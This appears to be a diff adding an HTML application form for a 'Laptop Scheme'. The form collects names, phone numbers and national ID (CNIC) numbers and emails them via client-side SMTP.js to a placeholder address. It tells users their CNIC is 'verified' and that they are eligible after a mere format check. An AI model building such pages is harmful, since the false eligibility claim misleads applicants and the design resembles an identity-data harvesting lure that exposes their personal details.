@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laptop Scheme Application</title>
+    <style>
+        /* === Global Page Style === */
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background: url('public/laptop_pic.jpg') no-repeat center center/cover; /* 🔹 your background image */
+            display: flex;
+            justify-content: flex-start; /* align form left */
+            align-items: center;
+            color: white;
+        }
+
+        /* === Form Container === */
+        .form-container {
+            background: rgba(0, 0, 0, 0.75); /* dark transparent box */
+            padding: 30px;
+            border-radius: 12px;
+            width: 360px;
+            margin-left: 60px;
+            box-shadow: 0 0 15px rgba(255,255,255,0.3);
+            animation: slideIn 1s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-30px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* === Headings === */
+        h2 {
+            text-align: center;
+            color: #ffcc00;
+            margin-bottom: 20px;
+        }
+
+        /* === Inputs & Selects === */
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+        }
+
+        input:focus, select:focus {
+            box-shadow: 0 0 5px #ffcc00;
+        }
+
+        /* === CNIC Message === */
+        #cnicMsg {
+            font-size: 14px;
+            margin-top: -4px;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .valid { color: lightgreen; }
+        .invalid { color: #ff6666; }
+
+        /* === Button === */
+        button {
+            width: 100%;
+            margin-top: 15px;
+            padding: 10px;
+            background: #ffcc00;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            color: black;
+        }
+
+        button:hover:not(:disabled) {
+            background: #ffaa00;
+            transform: scale(1.03);
+        }
+
+        button:disabled {
+            background: gray;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Laptop Scheme Form</h2>
+
+    <form id="laptopForm">
+        <input type="text" id="name" placeholder="Full Name" required>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="text" id="phone" placeholder="Phone Number" required>
+
+        <input type="text" id="cnic" placeholder="CNIC (12345-1234567-1)"
+               pattern="[0-9]{5}-[0-9]{7}-[0-9]{1}"
+               title="Enter CNIC in format 12345-1234567-1" required>
+
+        <div id="cnicMsg"></div>
+
+        <select id="program" required>
+            <option value="">-- Select Program --</option>
+            <option>BS Computer Science</option>
+            <option>BS IT</option>
+            <option>BBA</option>
+            <option>Engineering</option>
+            <option>Other</option>
+        </select>
+
+        <input type="text" id="city" placeholder="City" required>
+
+        <select id="education" required>
+            <option value="">-- Select Education Level --</option>
+            <option>Intermediate</option>
+            <option>Bachelor</option>
+            <option>Master</option>
+            <option>PhD</option>
+        </select>
+
+        <select id="brand" required>
+            <option value="">-- Select Laptop Brand --</option>
+            <option>HP</option>
+            <option>Dell</option>
+            <option>Lenovo</option>
+            <option>Asus</option>
+            <option>Acer</option>
+            <option>Apple</option>
+        </select>
+
+        <button type="submit" id="submitBtn" disabled>Submit Form</button>
+    </form>
+</div>
+
+<script>
+    const cnicInput = document.getElementById("cnic");
+    const cnicMsg = document.getElementById("cnicMsg");
+    const submitBtn = document.getElementById("submitBtn");
+
+    // ✅ CNIC Validation Live
+    cnicInput.addEventListener("input", () => {
+        const pattern = /^[0-9]{5}-[0-9]{7}-[0-9]{1}$/;
+        if (pattern.test(cnicInput.value)) {
+            cnicMsg.textContent = "✅ CNIC Verified. You are eligible for Laptop Scheme!";
+            cnicMsg.className = "valid";
+            submitBtn.disabled = false;
+        } else {
+            cnicMsg.textContent = "❌ Invalid CNIC. Please enter correct format (12345-1234567-1)";
+            cnicMsg.className = "invalid";
+            submitBtn.disabled = true;
+        }
+    });
+
+    // ✅ Form Submission (Email via SMTP.js)
+    document.getElementById("laptopForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        const name = document.getElementById("name").value;
+        const email = document.getElementById("email").value;
+        const phone = document.getElementById("phone").value;
+        const cnic = document.getElementById("cnic").value;
+        const program = document.getElementById("program").value;
+        const city = document.getElementById("city").value;
+        const education = document.getElementById("education").value;
+        const brand = document.getElementById("brand").value;
+
+        const message = `
+        <b>New Laptop Scheme Submission</b><br><br>
+        <b>Name:</b> ${name}<br>
+        <b>Email:</b> ${email}<br>
+        <b>Phone:</b> ${phone}<br>
+        <b>CNIC:</b> ${cnic}<br>
+        <b>Program:</b> ${program}<br>
+        <b>City:</b> ${city}<br>
+        <b>Education:</b> ${education}<br>
+        <b>Laptop Brand:</b> ${brand}
+      `;
+
+        Email.send({
+            SecureToken: "YOUR_SMTPJS_TOKEN",  // 🔹 Replace with your real token
+            To: "your_email@example.com",      // 🔹 Your receiving email
+            From: "your_email@example.com",
+            Subject: "New Laptop Scheme Application",
+            Body: message
+        }).then(() => {
+            alert("Form submitted successfully! Redirecting to next step...");
+            window.location.href = "page_02.html";
+        }).catch(err => {
+            alert("Error sending email: " + err);
+        });
+    });
+</script>
+
+<!-- SMTP.js for sending emails -->
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</body>
+</html>
